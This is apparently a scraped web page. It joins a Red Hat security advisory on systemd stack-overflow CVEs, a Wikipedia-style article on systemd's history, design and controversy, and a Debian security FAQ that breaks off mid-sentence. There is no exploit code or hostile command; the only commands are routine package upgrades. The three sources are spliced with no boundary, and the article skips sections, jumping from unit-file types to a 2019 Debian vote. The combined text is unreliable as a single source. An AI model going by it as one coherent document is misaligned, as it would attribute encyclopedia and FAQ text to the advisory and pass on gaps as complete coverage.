Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2019%3A0271)

## Topic

An update for systemd is now available for Red Hat Enterprise Linux 7.4 Extended Update Support.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The systemd packages contain systemd, a system and service manager for Linux, compatible with the SysV and LSB init scripts. It provides aggressive parallelism capabilities, uses socket and D-Bus activation for starting services, offers on-demand starting of daemons, and keeps track of processes using Linux cgroups. In addition, it supports snapshotting and restoring of the system state, maintains mount and automount points, and implements an elaborate transactional dependency-based service control logic. It can also work as a drop-in replacement for sysvinit.

Security Fix(es):

* systemd: stack overflow when calling syslog from a command with long cmdline (CVE-2018-16864)
* systemd: stack overflow when receiving many journald entries (CVE-2018-16865)

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Red Hat would like to thank Qualys Research Labs for reporting these issues.

**systemd** is a [software suite](/wiki/Software_suite "Software suite") that provides an array of system components for [Linux](/wiki/Linux "Linux")[[7]](#cite_note-7) operating systems. The main aim is to unify service configuration and behavior across [Linux distributions](/wiki/Linux_distribution "Linux distribution").[[8]](#cite_note-8) Its primary component is a "system and service manager" — an [init](/wiki/Init "Init") system used to [bootstrap](/wiki/Bootstrapping "Bootstrapping") [user space](/wiki/User_space "User space") and manage [user processes](/wiki/Process_%28computing%29 "Process (computing)"). It also provides replacements for various [daemons](/wiki/Daemon_%28computing%29 "Daemon (computing)") and utilities, including device management, login management, network connection management, and event logging. The name *systemd* adheres to the [Unix](/wiki/Unix "Unix") convention of naming daemons by appending the letter *d*.[[9]](#cite_note-9) It also plays on the term "[System D](/wiki/System_D "System D")", which refers to a person's ability to adapt quickly and improvise to solve problems.[[10]](#cite_note-control-center-10)

Since 2015, the majority of Linux distributions have adopted systemd, having replaced other init systems such as [SysV init](/wiki/SysV_init "SysV init"). It has been praised by developers and users of distributions that adopted it for providing a stable, fast out-of-the-box solution for issues that had existed in the Linux space for years.[[11]](#cite_note-11)[[12]](#cite_note-12)[[13]](#cite_note-arch-migration-to-systemd-13) At the time of adoption of systemd on most Linux distributions, it was the only software suite that offered reliable [parallelism](/wiki/Parallelism_%28computing%29 "Parallelism (computing)") during boot as well as centralized management of [processes](/wiki/Process_%28computing%29 "Process (computing)"), daemons, services and [mount points](/wiki/Mount_point "Mount point").

Critics of systemd contend that it suffers from [mission creep](/wiki/Mission_creep "Mission creep") and [bloat](/wiki/Software_bloat "Software bloat"), the latter affecting other software (such as the [GNOME](/wiki/GNOME "GNOME") desktop), adding dependencies on systemd, reducing its compatibility with other [Unix-like operating systems](/wiki/Unix-like "Unix-like") and making it difficult for sysadmins to integrate alternative solutions. In addition, they contend that the complexity of systemd results in a larger [attack surface](/wiki/Attack_surface "Attack surface"), reducing the overall security of the platform.[[14]](#cite_note-14) Concerns have also been raised about [Red Hat](/wiki/Red_Hat "Red Hat") and its parent company [IBM](/wiki/IBM "IBM") controlling the scene of init systems on Linux.[[15]](#cite_note-15)[[1]](#cite_note-The_New_Stack-1) A number of new forked Linux distributions have since been created that use alternative init systems like SysV or [OpenRC](/wiki/OpenRC "OpenRC").[[16]](#cite_note-16) Systemd has not been adopted by Unix-like systems outside the Linux space, like [FreeBSD](/wiki/FreeBSD "FreeBSD"), [OpenBSD](/wiki/OpenBSD "OpenBSD") and [Solaris](/wiki/Oracle_Solaris "Oracle Solaris").

## History

[[edit](/w/index.php?title=Systemd&action=edit&section=1 "Edit section: History")]

[Lennart Poettering](/wiki/Lennart_Poettering "Lennart Poettering") and [Kay Sievers](/wiki/Kay_Sievers "Kay Sievers"), the [software engineers](/wiki/Software_engineer "Software engineer") then working for [Red Hat](/wiki/Red_Hat "Red Hat") who initially developed systemd,[[2]](#cite_note-README-2) started a project to replace Linux's conventional System V init in 2010.[[17]](#cite_note-17) An April 2010 blog post from Poettering, titled "Rethinking PID 1", introduced an experimental version of what would later become systemd.[[18]](#cite_note-18) They sought to surpass the efficiency of the [init daemon](/wiki/Init "Init") in several ways. They wanted to improve the [software framework](/wiki/Software_framework "Software framework") for expressing dependencies, to allow more processes to run [concurrently](/wiki/Concurrency_%28computer_science%29 "Concurrency (computer science)") or in [parallel](/wiki/Parallel_computing "Parallel computing") during system [booting](/wiki/Booting "Booting"), and to reduce the [computational overhead](/wiki/Overhead_%28computing%29 "Overhead (computing)") of the [shell](/wiki/Shell_%28computing%29 "Shell (computing)").

In May 2011, [Fedora Linux](/wiki/Fedora_Linux "Fedora Linux") became the first major Linux distribution to enable systemd by default, replacing [Upstart](/wiki/Upstart_%28software%29 "Upstart (software)"). The reasoning at the time was that systemd provided extensive parallelization during startup, better management of processes and overall a saner, dependency-based approach to control of the system.[[19]](#cite_note-fedora-systemd-19)

In October 2012, [Arch Linux](/wiki/Arch_Linux "Arch Linux") made systemd the default, switching from [SysVinit](/wiki/SysVinit "SysVinit").[[20]](#cite_note-20) Developers had debated since August 2012[[13]](#cite_note-arch-migration-to-systemd-13) and came to the conclusion that it was faster and had more features than SysVinit, and that maintaining the latter was not worth the effort in patches.[[21]](#cite_note-21) Some of them thought that the criticism towards the implementation of systemd was not based on actual shortcomings of the software, rather the disliking of Lennart from a part of the Linux community and the general hesitation for change. Specifically, some of the complaints regarding systemd not being programmed in bash, it being bigger and more extensive than SysVinit, the use of [D-bus](/wiki/D-bus "D-bus"), and the optional on-disk format of the journal were regarded as advantages by programmers.[[22]](#cite_note-22)

Between October 2013 and February 2014, a long debate among the Debian Technical Committee occurred on the [Debian](/wiki/Debian "Debian") mailing list,[[23]](#cite_note-debian-bug-23) discussing which init system to use as the default in Debian 8 "jessie", and culminating in a decision in favor of systemd. The debate was widely publicized[[24]](#cite_note-lwn-20131105-24)[[25]](#cite_note-phoronix-20131230-25) and in the wake of the decision the debate continues on the Debian mailing list. In February 2014, after Debian's decision was made, [Mark Shuttleworth](/wiki/Mark_Shuttleworth "Mark Shuttleworth") announced in his blog that [Ubuntu](/wiki/Ubuntu_%28operating_system%29 "Ubuntu (operating system)") would follow in implementing systemd, discarding its own [Upstart](/wiki/Upstart_%28software%29 "Upstart (software)").[[26]](#cite_note-Shuttleworth-26)[[27]](#cite_note-quantal-27)

In November 2014, Debian Developer Joey Hess,[[28]](#cite_note-hess-resignation-28) Debian Technical Committee members Russ Allbery[[29]](#cite_note-allbery-resignation-29) and [Ian Jackson](/wiki/Ian_Jackson "Ian Jackson"),[[30]](#cite_note-jackson-resignation-30) and systemd package-maintainer Tollef Fog Heen[[31]](#cite_note-heen-resignation-31) resigned from their positions. All four justified their decision on the public Debian mailing list and in personal blogs with their exposure to extraordinary stress-levels related to ongoing disputes on systemd integration within the Debian and [FOSS](/wiki/FOSS "FOSS") community that rendered regular maintenance virtually impossible.

In August 2015, systemd started providing a login shell, callable via **`machinectl shell`**.[[32]](#cite_note-32)

In September 2016, a [security bug](/wiki/Security_bug "Security bug") was discovered that allowed any unprivileged user to perform a denial-of-service attack against systemd.[[33]](#cite_note-33) Rich Felker, developer of [musl](/wiki/Musl "Musl"), stated that this bug reveals a major "system development design flaw".[[34]](#cite_note-34) In 2017 another security bug was discovered in systemd, [CVE](/wiki/CVE_%28identifier%29 "CVE (identifier)")-[2017-9445](https://nvd.nist.gov/vuln/detail/CVE-2017-9445), which "allows disruption of service" by a "malicious DNS server".[[35]](#cite_note-35)[[36]](#cite_note-36) Later in 2017, the [Pwnie Awards](/wiki/Pwnie_Awards "Pwnie Awards") gave author Lennart Poettering a "lamest vendor response" award due to his handling of the vulnerabilities.[[37]](#cite_note-37)

## Design

[[edit](/w/index.php?title=Systemd&action=edit&section=2 "Edit section: Design")]
[![](//upload.wikimedia.org/wikipedia/commons/thumb/3/35/Systemd_components.svg/440px-Systemd_components.svg.png)](/wiki/File%3ASystemd_components.svg)

The architecture of systemd as it is used by [Tizen](/wiki/Tizen "Tizen"). Several systemd targets, including `telephony`, `bootmode`, `dlog`, and `tizen service` are from Tizen and are not components of systemd.[[38]](#cite_note-Gundersen2014-38)

[![](//upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Linux_kernel_unified_hierarchy_cgroups_and_systemd.svg/440px-Linux_kernel_unified_hierarchy_cgroups_and_systemd.svg.png)](/wiki/File%3ALinux_kernel_unified_hierarchy_cgroups_and_systemd.svg)

Unified-hierarchy [cgroups](/wiki/Cgroups "Cgroups") will be accessible exclusively by systemd through `systemd-nspawn`[[39]](#cite_note-39)

Poettering describes systemd development as "never finished, never complete, but tracking progress of technology". In May 2014, Poettering further described systemd as unifying "pointless differences between distributions", by providing the following three general functions:[[40]](#cite_note-gnome_asia_2014-40)

* A system and service manager (manages both the system, by applying various configurations, and its services)
* A [software platform](/wiki/Computing_platform "Computing platform") (serves as a basis for developing other software)
* The glue between [applications](/wiki/Application_software "Application software") and the [kernel](/wiki/Linux_kernel "Linux kernel") (provides various interfaces that expose functionalities provided by the kernel)

systemd includes features like on-demand starting of daemons, snapshot support, process tracking[[41]](#cite_note-41) and Inhibitor Locks.[[42]](#cite_note-42) It is not just the name of the init daemon but also refers to the entire software bundle around it, which, in addition to the systemd init daemon, includes the daemons journald, logind and networkd, and many other low-level components. In January 2013, Poettering described systemd not as one program, but rather a large software suite that includes 69 individual binaries.[[43]](#cite_note-biggest_myths-43) As an integrated [software suite](/wiki/Software_suite "Software suite"), systemd replaces the [startup sequences](/wiki/Linux_startup_process "Linux startup process") and [runlevels](/wiki/Runlevel "Runlevel") controlled by the traditional init daemon, along with the [shell scripts](/wiki/Shell_script "Shell script") executed under its control. systemd also integrates many other services that are common on Linux systems by handling user logins, the [system console](/wiki/System_console "System console"), device hotplugging (see [udev](/wiki/Udev "Udev")), scheduled execution (replacing [cron](/wiki/Cron "Cron")), logging, hostnames and locales.

Like the init daemon, systemd is a daemon that manages other daemons, which, including systemd itself, are [background processes](/wiki/Background_process "Background process"). systemd is the first daemon to start during [booting](/wiki/Booting "Booting") and the last daemon to terminate during [shutdown](/wiki/Shutdown_%28computing%29 "Shutdown (computing)"). The systemd daemon serves as the root of the user space's [process tree](/wiki/Child_process "Child process"); the first process ([PID](/wiki/Process_identifier "Process identifier") 1) has a special role on Unix systems, as it replaces the parent of a process when the original parent terminates. Therefore, the first process is particularly well suited for the purpose of monitoring daemons.

systemd executes elements of its startup sequence in parallel, which is theoretically faster than the traditional startup sequence approach.[[44]](#cite_note-debian-debate-44) For [inter-process communication](/wiki/Inter-process_communication "Inter-process communication") (IPC), systemd makes [Unix domain sockets](/wiki/Unix_domain_socket "Unix domain socket") and [D-Bus](/wiki/D-Bus "D-Bus") available to the running daemons. The state of systemd itself can also be preserved in a [snapshot](/wiki/Snapshot_%28computer_storage%29 "Snapshot (computer storage)") for future recall.

### Core components and libraries

[[edit](/w/index.php?title=Systemd&action=edit&section=3 "Edit section: Core components and libraries")]

Following its integrated approach, systemd also provides replacements for various daemons and utilities, including the startup shell scripts, pm-utils, [inetd](/wiki/Inetd "Inetd"), acpid, [syslog](/wiki/Syslog "Syslog"), watchdog, [cron](/wiki/Cron "Cron") and [atd](/wiki/At_%28command%29 "At (command)"). systemd's core components include:

* systemd is a system and service manager for Linux operating systems.
* systemctl is a command to introspect and control the state of the systemd system and service manager. Not to be confused with [sysctl](/wiki/Sysctl "Sysctl").
* systemd-analyze may be used to determine system boot-up performance statistics and retrieve other state and tracing information from the system and service manager.

systemd tracks processes using the Linux kernel's [cgroups](/wiki/Cgroups "Cgroups") subsystem instead of using [process identifiers](/wiki/Process_identifier "Process identifier") (PIDs); thus, daemons cannot "escape" systemd, not even by double-[forking](/wiki/Fork_%28system_call%29 "Fork (system call)"). systemd not only uses cgroups, but also augments them with systemd-nspawn and machinectl, two utility programs that facilitate the creation and management of [Linux containers](/wiki/Linux_containers "Linux containers").[[45]](#cite_note-lwn-20131107-45) Since version 205, systemd also offers ControlGroupInterface, which is an API to the Linux kernel cgroups.[[46]](#cite_note-systemd-controller-46) The Linux kernel cgroups are adapted to support [kernfs](/wiki/Kernfs_%28Linux%29 "Kernfs (Linux)"),[[47]](#cite_note-lkml-20140128-47) and are being modified to support a unified hierarchy.[[48]](#cite_note-lkml-20140313-48)

### Ancillary components

[[edit](/w/index.php?title=Systemd&action=edit&section=4 "Edit section: Ancillary components")]

Beside its primary purpose of providing a Linux init system, the systemd suite can provide additional functionality, including the following components:

journald
systemd-journald is a daemon responsible for [event](/wiki/Event_%28computing%29 "Event (computing)") [logging](/wiki/Logfile "Logfile"), with append-only [binary files](/wiki/Binary_file "Binary file") serving as its [logfiles](/wiki/Logfile "Logfile"). The [system administrator](/wiki/System_administrator "System administrator") may choose whether to log system events with systemd-journald, [syslog-ng](/wiki/Syslog-ng "Syslog-ng") or [rsyslog](/wiki/Rsyslog "Rsyslog"). The potential for corruption of the binary format has led to much heated debate.[[49]](#cite_note-49)
libudev
libudev is the standard library for utilizing udev, which allows third-party applications to query udev resources.
localed
localed manages the [system locale](/wiki/Locale_%28computer_software%29 "Locale (computer software)") and [keyboard layout](/wiki/Keyboard_layout "Keyboard layout").
logind
systemd-logind is a daemon that manages user logins and seats in various ways. It is an integrated login manager that offers [multiseat](/wiki/Multiseat_configuration "Multiseat configuration") improvements[[50]](#cite_note-logind-service-50) and replaces *ConsoleKit*, which is no longer maintained.[[51]](#cite_note-consolekit-51) For [X11 display managers](/wiki/X_display_manager_%28program_type%29 "X display manager (program type)") the switch to logind requires a minimal amount of porting.[[52]](#cite_note-display-managers-52) It was integrated in systemd version 30.
hostnamed
hostnamed manages the [system hostname](/wiki/Hostname "Hostname").
homed
homed is a daemon that provides portable human-user accounts that are independent of current system configuration. homed moves various pieces of data such as UID/GID from various places across the filesystem into one file, `~/.identity`. homed manages the user's home directory in various ways such as a plain directory, a [btrfs](/wiki/Btrfs "Btrfs") subvolume, a [Linux Unified Key Setup](/wiki/Linux_Unified_Key_Setup "Linux Unified Key Setup") volume, an fscrypt directory, or mounted from an [SMB](/wiki/Server_Message_Block "Server Message Block") server.
networkd
networkd is a daemon to handle the configuration of the network interfaces; in version 209, when it was first integrated, support was limited to statically assigned addresses and basic support for [bridging](/wiki/Bridging_%28networking%29 "Bridging (networking)") configuration.[[53]](#cite_note-systemd-1-53)[[54]](#cite_note-systemd-2-54)[[55]](#cite_note-systemd-3-55)[[56]](#cite_note-systemd-4-56)[[57]](#cite_note-systemd-5-57) In July 2014, systemd version 215 was released, adding new features such as a [DHCP](/wiki/DHCP "DHCP") server for [IPv4](/wiki/IPv4 "IPv4") hosts, and [VXLAN](/wiki/VXLAN "VXLAN") support.[[58]](#cite_note-phoronix-20140704-58)[[59]](#cite_note-59) `networkctl` may be used to review the state of the network links as seen by systemd-networkd.[[60]](#cite_note-60) Configuration of new interfaces has to be added under the /lib/systemd/network/ as a new file ending with .network extension.
resolved
provides network name resolution to local applications
systemd-boot
[systemd-boot](/wiki/Systemd-boot "Systemd-boot") is a boot manager, formerly known as [gummiboot](/wiki/Gummiboot_%28software%29 "Gummiboot (software)"). Kay Sievers merged it into systemd with rev 220.
systemd-bsod
systemd-bsod is an error reporter used to generate [Blue Screen of Death](/wiki/Blue_Screen_of_Death "Blue Screen of Death").
systemd-nspawn
systemd-nspawn may be used to run a command or OS in a namespace container.
timedated
systemd-timedated is a daemon that can be used to control time-related settings, such as the system time, system [time zone](/wiki/Time_zone "Time zone"), or selection between [UTC](/wiki/Coordinated_Universal_Time "Coordinated Universal Time") and local time-zone system clock. It is accessible through D-Bus.[[61]](#cite_note-timedated-61) It was integrated in systemd version 30.
timesyncd
timesyncd is a client [NTP](/wiki/Network_Time_Protocol "Network Time Protocol") daemon for synchronizing the system clock across the network.
tmpfiles
systemd-tmpfiles is a utility that takes care of creation and clean-up of temporary files and directories. It is normally run once at startup and then in specified intervals.
udevd
[udev](/wiki/Udev "Udev") is a device manager for the [Linux kernel](/wiki/Linux_kernel "Linux kernel"), which handles the /dev directory and all [user space](/wiki/User_space "User space") actions when adding/removing devices, including [firmware](/wiki/Firmware "Firmware") loading. In April 2012, the [source tree](/wiki/Source_tree "Source tree") for udev was [merged](/wiki/Merge_%28revision_control%29 "Merge (revision control)") into the systemd source tree.[[62]](#cite_note-sievers-20120403-62)[[63]](#cite_note-sievers-20120525-63) In order to match the version number of udev, systemd maintainers bumped the version number directly from 44 to 183.[[64]](#cite_note-64)
On 29 May 2014, support for firmware loading through udev was dropped from systemd, as it was decided that the kernel should be responsible for loading firmware.[[65]](#cite_note-65)
### Configuration of systemd

[[edit](/w/index.php?title=Systemd&action=edit&section=5 "Edit section: Configuration of systemd")]
[![](//upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Systemd_manager.png/220px-Systemd_manager.png)](/wiki/File%3ASystemd_manager.png)

systemd-manager, a tool to configure systemd

systemd is configured exclusively via [plain](/wiki/Plain_text "Plain text")-[text files](/wiki/Text_file "Text file") although GUI tools such as systemd-manager are also available.

systemd records initialization instructions for each daemon in a [configuration file](/wiki/Configuration_file "Configuration file") (referred to as a "unit file") that uses a [declarative language](/wiki/Declarative_language "Declarative language"), replacing the traditionally used per-daemon startup [shell scripts](/wiki/Shell_script "Shell script"). The syntax of the language is inspired by [.ini files](/wiki/INI_file "INI file").[[66]](#cite_note-66)

Unit-file types[[67]](#cite_note-unitfiles-67) include:

* .service
* .socket
* .device (automatically initiated by systemd[[68]](#cite_note-68))
* .mount
* .automount
* .swap
* .target
* .path
* .timer (which can be used as a [cron](/wiki/Cron "Cron")-like [job scheduler](/wiki/Job_scheduler "Job scheduler")[[69]](#cite_note-phoronix-20130128-69))
* .snapshot
* .slice (used to group and manage processes and resources[[70]](#cite_note-70))
* .scope (used to group worker processes, not intended to be configured via unit files[[71]](#cite_note-71))

In December 2019, the Debian project voted in favour of retaining systemd as the default init system for the distribution, but with support for "exploring alternatives".[[101]](#cite_note-104)

### Integration with other software

[[edit](/w/index.php?title=Systemd&action=edit&section=7 "Edit section: Integration with other software")]

In the interest of enhancing the interoperability between systemd and the [GNOME](/wiki/GNOME "GNOME") desktop environment, systemd coauthor Lennart Poettering asked [the GNOME Project](/wiki/The_GNOME_Project "The GNOME Project") to consider making systemd an external [dependency](/wiki/Dependency_%28computer_science%29 "Dependency (computer science)") of GNOME 3.2.[[102]](#cite_note-Poettering-GNOME-105)

In November 2012, the GNOME Project concluded that basic GNOME functionality should not rely on systemd.[[103]](#cite_note-Paters-106) However, GNOME 3.8 introduced a compile-time choice between the logind and ConsoleKit API, the former being provided at the time only by systemd. Ubuntu provided a separate logind binary, but systemd became a *de facto* dependency of GNOME for most [Linux distributions](/wiki/Linux_distribution "Linux distribution"), in particular since ConsoleKit is no longer actively maintained and upstream recommends the use of systemd-logind instead.[[104]](#cite_note-consolekit-abandoned-107) The developers of [Gentoo Linux](/wiki/Gentoo_Linux "Gentoo Linux") also attempted to adapt these changes in [OpenRC](/wiki/OpenRC "OpenRC"), but the implementation contained too many bugs, causing the distribution to mark systemd as a dependency of GNOME.[[105]](#cite_note-Vitters-108)[[106]](#cite_note-wayland-109)

GNOME has further integrated logind.[[107]](#cite_note-systemd-gnome-110) As of [Mutter](/wiki/Mutter_%28software%29 "Mutter (software)") version 3.13.2, logind is a dependency for [Wayland](/wiki/Wayland_%28software%29 "Wayland (software)") sessions.[[108]](#cite_note-mutter-logind-111)

## Reception

[[edit](/w/index.php?title=Systemd&action=edit&section=8 "Edit section: Reception")]

The design of systemd has ignited controversy within the [free-software community](/wiki/Free-software_community "Free-software community"). Critics regard systemd as overly complex and suffering from continued [feature creep](/wiki/Feature_creep "Feature creep"), arguing that its architecture violates the [Unix philosophy](/wiki/Unix_philosophy "Unix philosophy"). There is also concern that it forms a system of interlocked dependencies, thereby giving distribution maintainers little choice but to adopt systemd as more user-space software comes to depend on its components, which is similar to the problems created by [PulseAudio](/wiki/PulseAudio "PulseAudio"), another of Lennart Poettering's projects.[[109]](#cite_note-112)[[110]](#cite_note-113)

In a 2012 interview, [Slackware](/wiki/Slackware "Slackware")'s lead [Patrick Volkerding](/wiki/Patrick_Volkerding "Patrick Volkerding") expressed reservations about the systemd architecture, stating his belief that its design was contrary to the Unix philosophy of interconnected utilities with narrowly defined functionalities.[[111]](#cite_note-volkerding-2012-114) As of August 2018[[update]](https://en.wikipedia.org/w/index.php?title=Systemd&action=edit), Slackware does not support or use systemd, but Volkerding has not ruled out the possibility of switching to it.[[112]](#cite_note-slackware-systemd-115)

In January 2013, Lennart Poettering attempted to address concerns about systemd in a blog post called *The Biggest Myths*.[[43]](#cite_note-biggest_myths-43)

In February 2014, [musl](/wiki/Musl "Musl")'s Rich Felker opined that [PID](/wiki/Process_identifier "Process identifier") 1 is too special to be saddled with additional responsibilities, believing that PID 1 should only be responsible for starting the rest of the init system and reaping [zombie processes](/wiki/Zombie_process "Zombie process"), and that the additional functionality added by systemd can be provided elsewhere and unnecessarily increases the complexity and attack surface of PID 1.[[113]](#cite_note-116)

In March 2014, [Eric S. Raymond](/wiki/Eric_S._Raymond "Eric S. Raymond") commented that systemd's design goals were prone to [mission creep](/wiki/Mission_creep "Mission creep") and [software bloat](/wiki/Software_bloat "Software bloat").[[114]](#cite_note-esr-slashdot-2014-117) In April 2014, [Linus Torvalds](/wiki/Linus_Torvalds "Linus Torvalds") expressed reservations about the attitude of [Kay Sievers](/wiki/Kay_Sievers "Kay Sievers"), a key systemd developer, toward users and bug reports in regard to modifications to the Linux kernel submitted by Sievers.[[115]](#cite_note-lkml-20140402-118) In late April 2014, a campaign to boycott systemd was launched, with a website listing various reasons against its adoption.[[116]](#cite_note-upload-119)[[117]](#cite_note-boycott-120)

In an August 2014 article published in *[InfoWorld](/wiki/InfoWorld "InfoWorld")*, Paul Venezia wrote about the systemd controversy and attributed the controversy to violation of the Unix philosophy, and to "enormous egos who firmly believe they can do no wrong".[[118]](#cite_note-apocalypse-121) The article also characterizes the architecture of systemd as similar to that of [svchost.exe](/wiki/Svchost.exe "Svchost.exe"), a critical system component in [Microsoft Windows](/wiki/Microsoft_Windows "Microsoft Windows") with a broad functional scope.[[118]](#cite_note-apocalypse-121)

In a September 2014 [ZDNet](/wiki/ZDNet "ZDNet") interview, prominent Linux kernel developer [Theodore Ts'o](/wiki/Theodore_Ts%27o "Theodore Ts'o") expressed his opinion that the dispute over systemd's centralized design philosophy, more than technical concerns, indicates a dangerous general trend toward uniformizing the Linux ecosystem, alienating and marginalizing parts of the open-source community, and leaving little room for alternative projects. He cited similarities with the attitude he found in the GNOME project toward non-standard configurations.[[119]](#cite_note-zdnet-20140919-122) On social media, Ts'o also later compared the attitudes of Sievers and his co-developer, Lennart Poettering, to that of GNOME's developers.[[120]](#cite_note-Tso-123)

## Forks and alternative implementations

[[edit](/w/index.php?title=Systemd&action=edit&section=9 "Edit section: Forks and alternative implementations")]

Forks of systemd are closely tied to critiques of it outlined in the above section. Forks generally try to improve on at least one of portability (to other libcs and Unix-like systems), modularity, or size. A few forks have collaborated under the FreeInit banner.[[121]](#cite_note-124)

### Forks of components

[[edit](/w/index.php?title=Systemd&action=edit&section=10 "Edit section: Forks of components")]
#### eudev

[[edit](/w/index.php?title=Systemd&action=edit&section=11 "Edit section: eudev")]

In 2012, the [Gentoo Linux](/wiki/Gentoo_Linux "Gentoo Linux") project created a [fork](/wiki/Fork_%28software_development%29 "Fork (software development)") of [udev](/wiki/Udev "Udev") in order to avoid dependency on the systemd architecture. The resulting fork is called *eudev* and it makes udev functionality available without systemd.[[122]](#cite_note-eudev-125) A stated goal of the project is to keep eudev independent of any Linux distribution or init system.[[123]](#cite_note-gentoo-eudev-126) In 2021, Gentoo announced that support of eudev would cease at the beginning of 2022. An independent group of maintainers have since taken up eudev.[[124]](#cite_note-eudev-news-127)

#### elogind

[[edit](/w/index.php?title=Systemd&action=edit&section=12 "Edit section: elogind")]

Elogind is the systemd project's "logind", extracted to be a standalone daemon. It integrates with PAM to know the set of users that are logged into a system and whether they are logged in graphically, on the console, or remotely. Elogind exposes this information via the standard org.freedesktop.login1 [D-Bus](/wiki/D-Bus "D-Bus") interface, as well as through the file system using systemd's standard /run/systemd layout. Elogind also provides "libelogind", which is a subset of the facilities offered by "libsystemd". There is a "libelogind.pc" [pkg-config](/wiki/Pkg-config "Pkg-config") file as well.[[125]](#cite_note-elogind-128)

### Alternatives to components

[[edit](/w/index.php?title=Systemd&action=edit&section=13 "Edit section: Alternatives to components")]
#### ConsoleKit2

[[edit](/w/index.php?title=Systemd&action=edit&section=14 "Edit section: ConsoleKit2")]

ConsoleKit was forked in October 2014 by [Xfce](/wiki/Xfce "Xfce") developers wanting its features to still be maintained and available on operating systems other than Linux. While not ruling out the possibility of reviving the original repository in the long term, the main developer considers ConsoleKit2 a temporary necessity until systembsd matures.[[126]](#cite_note-consolekit2-129)

### Abandoned forks

[[edit](/w/index.php?title=Systemd&action=edit&section=15 "Edit section: Abandoned forks")]
#### Fork of components

[[edit](/w/index.php?title=Systemd&action=edit&section=16 "Edit section: Fork of components")]
##### LoginKit

[[edit](/w/index.php?title=Systemd&action=edit&section=17 "Edit section: LoginKit")]

LoginKit was an attempt to implement a logind (systemd-logind) [shim](/wiki/Shim_%28computing%29 "Shim (computing)"), which would allow packages that depend on systemd-logind to work without dependency on a specific init system.[[127]](#cite_note-loginkit-130) The project has been defunct since February 2015.[[128]](#cite_note-131)

##### systembsd

[[edit](/w/index.php?title=Systemd&action=edit&section=18 "Edit section: systembsd")]

In 2014, a [Google Summer of Code](/wiki/Google_Summer_of_Code "Google Summer of Code") project named "systembsd" was started in order to provide alternative implementations of these APIs for [OpenBSD](/wiki/OpenBSD "OpenBSD"). The original project developer began it in order to ease his transition from Linux to OpenBSD.[[129]](#cite_note-undeadly_systembsd-132) Project development finished in July 2016.[[130]](#cite_note-133)

The systembsd project did not provide an init replacement, but aimed to provide OpenBSD with compatible daemons for hostnamed, timedated, localed, and logind. The project did not create new systemd-like functionality, and was only meant to act as a wrapper over the native OpenBSD system. The developer aimed for systembsd to be installable as part of the [ports collection](/wiki/Ports_collection "Ports collection"), not as part of a base system, stating that "systemd and \*BSD differ fundamentally in terms of philosophy and development practices."[[129]](#cite_note-undeadly_systembsd-132)

##### notsystemd

[[edit](/w/index.php?title=Systemd&action=edit&section=19 "Edit section: notsystemd")]

Notsystemd intends to implement all systemd's features working on any init system.[[131]](#cite_note-134) It was forked by the [Parabola GNU/Linux-libre](/wiki/Parabola_GNU/Linux-libre "Parabola GNU/Linux-libre") developers to build packages with their development tools without the necessity of having systemd installed to run systemd-nspawn. Development ceased in July 2018.[[132]](#cite_note-135)

#### Fork including init system

[[edit](/w/index.php?title=Systemd&action=edit&section=20 "Edit section: Fork including init system")]
##### uselessd

[[edit](/w/index.php?title=Systemd&action=edit&section=21 "Edit section: uselessd")]

In 2014, *uselessd* was created as a lightweight fork of systemd. The project sought to remove features and programs deemed unnecessary for an init system, as well as address other perceived faults.[[133]](#cite_note-phoronix_uselessd-136) Project development halted in January 2015.[[134]](#cite_note-137)

uselessd supported the [musl](/wiki/Musl "Musl") and [μClibc](/wiki/UClibc "UClibc") libraries, so it may have been used on [embedded systems](/wiki/Embedded_system "Embedded system"), whereas systemd only supports [glibc](/wiki/GNU_C_Library "GNU C Library"). The uselessd project had planned further improvements on cross-platform compatibility, as well as architectural overhauls and refactoring for the Linux build in the future.[[135]](#cite_note-uselessd_home-138)

##### InitWare

[[edit](/w/index.php?title=Systemd&action=edit&section=22 "Edit section: InitWare")]

InitWare is a modular refactor of systemd, porting the system to BSD platforms without glibc or Linux-specific system calls. It is known to work on DragonFly BSD, FreeBSD, NetBSD, and GNU/Linux. Components considered unnecessary are dropped.[[136]](#cite_note-139)

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
